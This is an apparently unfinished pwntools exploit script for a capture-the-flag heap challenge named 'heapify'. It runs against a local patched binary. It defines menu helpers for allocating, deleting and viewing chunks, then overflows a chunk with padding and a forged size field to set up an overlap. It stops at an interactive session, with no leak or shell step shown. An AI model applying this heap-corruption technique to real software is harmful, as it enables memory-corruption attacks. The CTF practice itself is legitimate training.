#!/usr/bin/env python3

from pwn import *

context.log_level='debug'
context.binary = elf = ELF("./heapify")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
r = process('./heapify_patched')
#r = gdb.debug('./heapify_patched', 'b *main+53\nc')

def alloc(sz, data):
    r.recvuntil(b': ')
    r.sendline(b'1')
    r.recvuntil(b': ')
    r.sendline(str(sz).encode())
    r.recvuntil(b': ')
    r.sendline(data)
    r.recvline()
def delete(i):
    r.recvuntil(b': ')
    r.sendline(b'2')
    r.recvuntil(b': ')
    r.sendline(str(i).encode())
def view(i):
    r.recvuntil(b': ')
    r.sendline(b'3')
    r.recvuntil(b': ')
    r.sendline(str(i).encode())

alloc(0x10, b'')
alloc(0x10, b'')
delete(1)
delete(0)
alloc(0x10, b'a'*0x18+p64(0x51))
delete(1)
r.interactive()
